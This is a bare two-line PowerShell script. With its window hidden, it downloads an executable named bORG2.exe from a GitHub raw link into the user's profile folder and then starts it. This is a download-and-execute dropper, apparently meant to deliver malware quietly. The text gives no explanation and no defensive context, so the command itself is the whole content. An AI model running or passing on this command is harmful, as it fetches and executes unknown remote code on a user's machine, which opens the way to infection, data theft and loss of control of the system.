powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/bORG2.exe?dl=1 -O $Env:USERPROFILE\bORG2.exe
start-process "$env:USERPROFILE\bORG2.exe"

